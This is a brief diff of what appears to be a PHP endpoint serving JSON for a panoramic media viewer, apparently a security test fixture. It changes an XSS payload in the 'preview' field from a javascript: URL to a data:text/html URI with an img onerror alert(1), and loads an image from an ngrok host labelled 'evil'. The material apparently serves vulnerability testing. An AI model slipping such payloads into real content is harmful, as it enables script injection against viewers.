@@ -7,7 +7,7 @@ header('Access-Control-Allow-Origin: *');
   "image": "http://bef4c411.ngrok.io/evil.jpg",
   "isStereo": true,
   "isYawOnly": false,
-  "preview": "javascript:alert(1)",
+  "preview": "data:text/html,<img src=x onerror=alert(1)>",
   "video": "",
   "pitch": -0.62,
   "yaw": 1.6
